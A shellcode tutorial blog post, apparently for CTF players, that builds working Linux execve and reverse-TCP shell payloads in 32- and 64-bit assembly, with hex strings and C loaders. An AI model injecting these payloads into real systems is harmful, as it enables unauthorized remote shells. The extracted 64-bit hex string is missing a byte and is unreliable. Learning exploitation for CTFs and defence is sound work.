---
title: "Linux Shellcode 101: From Hell to Shell"
excerpt: "Understand Shellcode on Linux 32bit and 64bit."
tags:
  - wargame
  - shellcode
  - exploit
---

---
We all love to do CTFs, Wargames and other challenges online (well, I do). But, most of the time, when we need a shellcode we get lazy and we Google some piece of (sh!t) shellcode that just doesn't work. And after 13 tries with different shellcodes, eventually, it works, or you just give up and grab the shellcode of someone who did solved the challenge. SHAME !

Just kidding, it happened to me, too. I mean, you solved the challenge, you got the control of the EIP, you just need a working shellcode, right ? Why, working your a$$ of ? 

# Why Write a Shellcode ?

Well first, if you just need a simple *execve()* on a `/bin/sh` you should know how to write it. Second, sometimes you'll face more *complex* situation where you'll need to know how to write a custom shellcode. In those use cases, you won't find anything online. Finally, when you do CTFs, speed is key. If you know your craft, you can write anything you want in the blink of an eye !

# From C to Assembly

Ultimately, you'll probably write your shellcode directly in assembly. However, it's interesting to understand the full process of converting a high-level piece of code to a binary string. Let's start with a simple C code :

```c
// gcc -o print print.c
#include <stdio.h>

void main() {
  printf("YOLO !\n");
}
```

Now, we can compile it and test it.

```bash
root@nms:~# gcc -o print print.c
root@nms:~# ./print
YOLO !
```

Here, we can use the `strace` command to see the inner working of our executable. This command intercepts and records the system calls which are called by a process and the signals which are received by a process.

```bash
root@nms:~# strace ./print
execve("./print", ["./print"], 0x7fffb1ec4320 /* 22 vars */) = 0
brk(NULL)                               = 0x55e96fbcd000
access("/etc/ld.so.preload", R_OK)      = -1 ENOENT (No such file or directory)
openat(AT_FDCWD, "/etc/ld.so.cache", O_RDONLY|O_CLOEXEC) = 3

...[removed]...

brk(NULL)                               = 0x55e96fbcd000
brk(0x55e96fbee000)                     = 0x55e96fbee000
write(1, "YOLO !\n", 7YOLO !
)                 = 7
exit_group(7)                           = ?
+++ exited with 7 +++
```

The interesting parts is the call to *write()* which is a [system call](http://man7.org/linux/man-pages/man2/write.2.html); the 4th.

**Note:** You can find a full reference of 32-bit system calls on [https://syscalls.kernelgrok.com/](https://syscalls.kernelgrok.com/).
{: .notice--info}

This call takes 3 arguments. The first one is **1** which asks the syscall to print the string on the standard ouput (*STDOUT*). The second is a pointer to our string and the third is the size of the string (*7*).

```c
ssize_t write(int fd, const void *buf, size_t count);
```

To use a **syscall** in assembly, we need to do call the interrupt 0x80 or `int 0x80`. Now, we can start writing the assembly code :

```nasm
; sudo apt-get install libc6-dev-i386
; nasm -f elf32 print_asm.asm
; ld -m elf_i386 print_asm.o -o print_asm
BITS 32
section .data
msg   db    "PLOP !", 0xa

section .text
global _start

_start:
mov eax, 4 ; syscall to write()
mov ebx, 1
mov ecx, msg
mov edx, 7
int 0x80

mov eax, 1
mov ebx, 0
int 0x80
```

Then, you can assemble it and link it :

```bash
root@nms:~/asm# nasm -f elf32 print_asm.asm
root@nms:~/asm# ld -m elf_i386 print_asm.o -o print_asm
root@nms:~/asm# ./print_asm
PLOP !
```

Alright, you have some knowledge about system calls and some basics about how to convert C code in assembly. 

# From Assembly To Shellcode

The next step is to convert our assembly code to a shellcode. But, what is a shellcode anyway ? Well, it's a string that can be executed by the CPU as binary code. Here is how it looks like in hexadecimal :

```nasm
root@nms:~/asm# objdump -Mintel -D print_asm

print_asm:     file format elf32-i386


Disassembly of section .text:

08049000 <_start>:
 8049000:	b8 04 00 00 00       	mov    eax,0x4
 8049005:	bb 01 00 00 00       	mov    ebx,0x1
 804900a:	b9 00 a0 04 08       	mov    ecx,0x804a000
 804900f:	ba 07 00 00 00       	mov    edx,0x7
 8049014:	cd 80                	int    0x80
 8049016:	b8 01 00 00 00       	mov    eax,0x1
 804901b:	bb 00 00 00 00       	mov    ebx,0x0
 8049020:	cd 80                	int    0x80

Disassembly of section .data:

0804a000 <msg>:
 804a000:	50                   	push   eax
 804a001:	4c                   	dec    esp
 804a002:	4f                   	dec    edi
 804a003:	50                   	push   eax
 804a004:	20 21                	and    BYTE PTR [ecx],ah
 804a006:	0a                   	.byte 0xa
 ```

**Note:** The `<msg>` function looks like assembly code but it's our string **"PLOP !"**. `Objdump` interprets it as code but, as you probably know, there are no real distinctions between *code* and *data* in machine code.
{: .notice--info}

The `<_start>` function contains our code. But, if you look closely, there are lots of *null* bytes. If you try to use this string as a shellcode, the computer will interpret *null* bytes as string terminators so, obviously, if it starts reading your shellcode and sees a null byte it will stop and probably crash the process. 

However, we often need null bytes in our code; as a parameter for a function or to declare a string variable. It's not that hard to remove null bytes from a shellcode, you just need to be creative and find alternate way to generate the null bytes you need.

Let me show you how it's done with our previous example :

```nasm
; nasm -f elf32 print_asm_2.asm
; ld -m elf_i386 print_asm_2.o -o print_asm_2
BITS 32

section .text
global _start

_start:
xor eax, eax    ; EAX = 0
push eax        ; string terminator (null byte)
push 0x0a202120 ; line return (\x0a) + " ! " (added space for padding)
push 0x504f4c50 ; "POLP"
mov ecx, esp    ; ESP is our string pointer
mov al, 4       ; AL is 1 byte, enough for the value 4
xor ebx, ebx    ; EBX = 0
inc ebx         ; EBX = 1
xor edx, edx    ; EDX = 0
mov dl, 8       ; DL is 1 byte, enough for the value 8 (added space)
int 0x80        ; print

mov al, 1       ; AL = 1
dec ebx         ; EBX was 1, we decrement
int 0x80        ; exit
```

Now, there are no null bytes ! You don't believe me ? Check that out :

```bash
$ nasm -f elf32 print_asm_2.asm
$ ld -m elf_i386 print_asm_2.o -o print_asm_2
$ ./print_asm_2
PLOP !
$ objdump -Mintel -D print_asm_2

print_asm_2:     file format elf32-i386


Disassembly of section .text:

08049000 <_start>:
 8049000:	31 c0                	xor    eax,eax
 8049002:	50                   	push   eax
 8049003:	68 20 21 20 0a       	push   0xa202120
 8049008:	68 50 4c 4f 50       	push   0x504f4c50
 804900d:	89 e1                	mov    ecx,esp
 804900f:	b0 04                	mov    al,0x4
 8049011:	31 db                	xor    ebx,ebx
 8049013:	43                   	inc    ebx
 8049014:	31 d2                	xor    edx,edx
 8049016:	b2 08                	mov    dl,0x8
 8049018:	cd 80                	int    0x80
 804901a:	b0 01                	mov    al,0x1
 804901c:	4b                   	dec    ebx
 804901d:	cd 80                	int    0x80
```

Here, we used multiple tricks to avoid null bytes. Instead of moving **0** to a register, we **XOR** it, the result is the same but no null bytes:

```bash
$ rasm2 -a x86 -b 32 "mov eax, 0"
b800000000
$ rasm2 -a x86 -b 32 "xor eax, eax"
31c0
```

Instead of moving a 1 byte value to a 4 bytes register, we use a 1 byte register :

```bash
$ rasm2 -a x86 -b 32 "mov eax, 1"
b801000000
$ rasm2 -a x86 -b 32 "mov al, 1"
b001
```

And for the string, we just pushed a zero on the stack for the terminator, pushed the string value in 4 bytes chunks (reversed, because of little-endian) and used *ESP* as a string pointer :

```bash
xor eax, eax    
push eax       
push 0x0a202120 ; line return + " ! "
push 0x504f4c50 ; "POLP"
mov ecx, esp
```

# The "shell" code

We had fun printing strings on our terminal but, where is the **"shell"** part of our shellcode ? Good question ! Let's create a shellcode which actually get us a shell prompt.

To do that, we will use another syscall, [execve](http://man7.org/linux/man-pages/man2/execve.2.html), which is number **11** or **0xb** in the [syscall table](https://syscalls.kernelgrok.com/). It takes 3 arguments :
  
  - The program to execute -> *EBX*
  - The arguments or *argv* (null) -> *ECX*
  - The environment or envp (null) -> *EDX*

```c
int execve(const char *filename, char *const argv[], char *const envp[]);
```

This time, we'll directly write the code without any null bytes.

```nasm
; nasm -f elf32 execve.asm
; ld -m elf_i386 execve.o -o execve
BITS 32

section .text
global _start

_start:
xor eax, eax
push eax        ; string terminator
push 0x68732f6e ; "hs/n"
push 0x69622f2f ; "ib//"
mov ebx, esp    ; "//bin/sh",0 pointer is ESP
xor ecx, ecx    ; ECX = 0
xor edx, edx    ; EDX = 0
mov al, 0xb     ; execve()
int 0x80  
```

Now, let's assemble it and check if it properly works and does not contain any *null* bytes.

```
# nasm -f elf32 execve.asm
# ld -m elf_i386 execve.o -o execve
# ./execve 
# id
uid=0(root) gid=0(root) groups=0(root)
# exit    

# objdump -Mintel -D execve

08049000 <_start>:
 8049000:       31 c0                   xor    eax,eax
 8049002:       50                      push   eax
 8049003:       68 6e 2f 73 68          push   0x68732f6e
 8049008:       68 2f 2f 62 69          push   0x69622f2f
 804900d:       89 e3                   mov    ebx,esp
 804900f:       31 c9                   xor    ecx,ecx
 8049011:       31 d2                   xor    edx,edx
 8049013:       b0 0b                   mov    al,0xb
 8049015:       cd 80                   int    0x80
```

**Note:** There are multiple ways to write the same shellcode, this is merely an example.
{: .notice--info}

I know what you are thinking: "Hey, this isn't a shellcode, it's an executable !", and you're right ! This is an **ELF** file.

```bash
$ file execve
execve: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), statically linked, not stripped
```

As we assembled (`nasm`) and linked (`ld`) our code, it's contained in an ELF but, in a real use case you don't inject an ELF file, as the executable you target is already mapped in memory you just need to inject the code. 

You can easly extract the shellcode using `objdump` and some *bash-fu* :

```bash
$ objdump -d ./execve|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'

"\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x31\xc9\x31\xd2\xb0\x0b\xcd\x80"
```

Now, you can use this string or *shellcode* and inject it into a process.

# Shellcode Loader

Now, let's say you want to test your shellcode. First, we need something to interpret our shellcode. As you know, a shellcode is meant to be injected into a running program as it doesn't have any function execute itself like a classic ELF. You can use the following piece of code to do that :

```c
// gcc -m32 -z execstack exec_shell.c -o exec_shell
#include <stdio.h>
#include <string.h>

unsigned char shell[] = "\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x31\xc9\x31\xd2\xb0\x0b\xcd\x80";

main() {
  int (*ret)() = (int(*)())shell;
  ret();
}
```

Or this one, which is slightly different :

```c
// gcc -m32 -z execstack exec_shell.c -o exec_shell
char shellcode[] =
	"\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x31\xc9\x31\xd2\xb0\x0b\xcd\x80";
 
int main(int argc, char **argv) {
	int *ret;
	ret = (int *)&ret + 2;  
	(*ret) = (int)shellcode;
}
```

**Note:** You can find some information about those C code [here](http://disbauxes.upc.es/code/two-basic-ways-to-run-and-test-shellcode/).
{: .notice--info}


# Connect-Back or Reverse TCP Shellcode

We could do a Bind TCP shellcode but, nowadays, firewalls block most of the incoming connection so we prefer that the shellcode automatically connect back to our machine. The main idea to this shellcode is to connect to our machine, on a specific port, and give us a shell. First, we need to create a socket with the *socket()* system call and connect the socket to the address of the server (our machine) using the *connect()* system call.

The socket syscall is called [socketcall()](http://man7.org/linux/man-pages/man2/socketcall.2.html) and use the number **0x66**. It takes 2 arguments :
  - The type of socket, here **SYS_SOCKET** or **1** -> *EBX*
  - The *args*, a pointer to the block containing the actual arguments -> *ECX*

```c
int socketcall(int call, unsigned long *args);
```

There are 3 arguments for a call to [socket()](http://man7.org/linux/man-pages/man2/socket.2.html):
  - The communication domain, here, *AF_INET* (2) or IPv4
  - The socket type, *SOCK_STREAM* (1) or TCP
  - The protocol to use, which is 0 because only a single protocol exists with TCP

```c
int socket(int domain, int type, int protocol);
```

Once, we created a socket, we need to connect to the remote machine using **SYS_CONNECT** or **3** type with the argument for *connect()*. Again, we reuse the syscall number **0x66** but with the following arguments :
  - The type of socket, here [SYS_CONNECT](http://man7.org/linux/man-pages/man2/connect.2.html) or **3** -> *EBX*
  - The *args*, a pointer to the block containing the actual arguments -> *ECX*

There are 3 arguments for a call to [connect()](http://man7.org/linux/man-pages/man2/connect.2.html):
  - The file descriptor previously created with *socket()*
  - The pointer to *sockaddr* structure containing the IP, port and address family (AF_INET)
  - The *addrlen* argument which specifies the size of *sockaddr*, or 16 bytes.

```c
int connect(int sockfd, const struct sockaddr *addr, socklen_t addrlen);
```

Just so you know, here is the definition of the *sockaddr* structure :

```c
struct sockaddr {
	sa_family_t	sa_family;	/* address family, AF_xxx	*/
	char		sa_data[14];	/* 14 bytes of protocol address	*/
};
```

Now, let's write that down :

```nasm
; nasm -f elf32 connectback.asm
; ld -m elf_i386 connectback.o -o connectback
BITS 32

section .text
global _start

_start:
; Call to socket(2, 1, 0)
push 0x66     ; socketcall()
pop eax 
xor ebx, ebx
inc ebx       ; EBX = 1 for SYS_SOCKET
xor edx, edx  ; Bulding args array for socket() call
push edx      ; proto = 0 (IPPROTO_IP)
push BYTE 0x1 ; SOCK_STREAM
push BYTE 0x2 ; AF_INET
mov ecx, esp  ; ECX contain the array pointer
int 0x80      ; After the call, EAX contains the file descriptor

xchg esi, eax ; ESI = fd

; Call to connect(fd, [AF_INET, 4444, 127.0.0.1], 16)
push 0x66         ; socketcall()
pop eax 
mov edx, 0x02010180 ; Trick to avoid null bytes (128.1.1.2)
sub edx, 0x01010101 ; 128.1.1.2 - 1.1.1.1 = 127.0.0.1
push edx          ; store 127.0.0.1
push WORD 0x5c11  ; push port 4444
inc ebx           ; EBX = 2
push WORD bx      ; AF_INET
mov ecx, esp      ; pointer to sockaddr
push BYTE 0x10    ; 16, size of addrlen
push ecx          ; new pointer to sockaddr
push esi          ; fd pointer
mov ecx, esp      ; ECX contain the array pointer
inc ebx           ; EBX = 3 for SYS_CONNECT
int 0x80          ; EAX contains the connected socket
```

Now assemble and link the shellcode then, open a listener in another shell and run the code :

```bash
$ nc -lvp 4444
listening on [any] 4444 ...
connect to [127.0.0.1] from localhost [127.0.0.1] 51834
```

Your shellcode will *segfault*, but that's normal. However, you should receive a connection on your listener. Now, we need to implement the **shell** part of our shellcode. To do that, we will have to play with the *file descriptors*. There are 3 standard file descriptors :
  - **stdin** or 0 (input)
  - **stdout** or 1 (output)
  - **stderr** or 2 (error)

The idea is to duplicate the standard file descriptors on the file descriptor obtained with the call to *connect()* then, call */bin/sh*. That way, we will be able to have a reverse shell on the target machine.

There is syscall called [dup2](http://man7.org/linux/man-pages/man2/dup2.2.html), number **0x3f**, which can help us with that task. It takes 2 arguments :
  - The old *fd* -> *EBX*
  - The new *fd* -> *ECX*

```c
int dup2(int oldfd, int newfd);
```

Let's implement the rest of the code :

```nasm
; Call to dup2(fd, ...) with a loop for the 3 descriptors
xchg eax, ebx   ; EBX = fd for connect()
push BYTE 0x2   ; we start with stderr
pop ecx

loop:
mov BYTE al, 0x3f ; dup2()
int 0x80
dec ecx
jns loop ; loop until sign flag is set meaning ECX is negative

; Call to execve()
xor eax, eax
push eax        ; string terminator
push 0x68732f6e ; "hs/n"
push 0x69622f2f ; "ib//"
mov ebx, esp    ; "//bin/sh",0 pointer is ESP
xor ecx, ecx    ; ECX = 0
xor edx, edx    ; EDX = 0
mov al, 0xb     ; execve()
int 0x80  
```

Re-assemble the shellcode with the added routine and run a listener, you should get a shell :

```bash
$ ./connectback 
# id
uid=0(root) gid=0(root) groups=0(root)
```

You can try to extract the shellcode, it should be null byte free :)

```bash
objdump -d ./connectback|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'

"\x6a\x66\x58\x31\xdb\x43\x31\xd2\x52\x6a\x01\x6a\x02\x89\xe1\xcd\x80\x96\x6a\x66\x58\xba\x80\x01\x01\x02\x81\xea\x01\x01\x01\x01\x52\x66\x68\x11\x5c\x43\x66\x53\x89\xe1\x6a\x10\x51\x56\x89\xe1\x43\xcd\x80\x93\x6a\x02\x59\xb0\x3f\xcd\x80\x49\x79\xf9\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x31\xc9\x31\xd2\xb0\x0b\xcd\x80"
```

# x64 Shellcode

We assume that you already know 64-bit assembly code, if you don't, well, it's almost the same as 32-bit instructions... Anyway, 64-bit shellcode is as easy as the 32-bit ones.

**Note:** You can find lots of references for 64-bit system calls on Internet, like this [one](https://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/).
{: .notice--info}

The main difference are : 
- Instead of calling `ìnt 0x80` to trigger the syscall, we use the `syscall` instruction
- Registers are **64-bit** (O RLY ?!)
- The *execve()* syscall is **59** (integer)
- Instead of using *EAX, EBX, ECX, etc.* for the syscall, it's *RAX, RDI, RSI, RDX, etc.*

Let's try to reproduce the *execve()* shellcode we did earlier.

```nasm
; nasm -f elf64 execve64.asm
; ld -m elf_x86_64 execve64.o -o execve64
section .text
global _start

_start:
xor rax, rax
push rax        ; string terminator
mov rax, 0x68732f6e69622f2f ; "hs/nib//" (Yay! 64-bit registers)
push rax
mov rdi, rsp    ; "//bin/sh",0 pointer is RSP
xor rsi, rsi    ; RSI = 0
xor rdx, rdx    ; RDX = 0
xor rax, rax    ; RAX = 0
mov al, 0x3b    ; execve()
syscall
```

**Note:** Here, we didn't directly pushed the string on the stack because pushing a 64-bit immediate value is not possible. So, we used RAX as an intermediate register.
{: .notice--info}

Now, you can try it. Note that the compilation arguments have changed.

```bash
$ nasm -f elf64 execve64.asm
$ ld -m elf_x86_64 execve64.o -o execve64
$ ./execve64 
# id
uid=0(root) gid=0(root) groups=0
```

Easy, right ?

```bash
$ objdump -d ./execve64|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'

"\x48\x31\xc0\x50\x48\xb8\x2f\x2f\x62\x69\x2f\x73\x68\x50\x48\x89\xe7\x48\x31\xf6\x48\x31\xd2\x48\x31\xc0\xb0\x3b\x0f\x05"
```

Your turn now, make them smaller, make them smarter !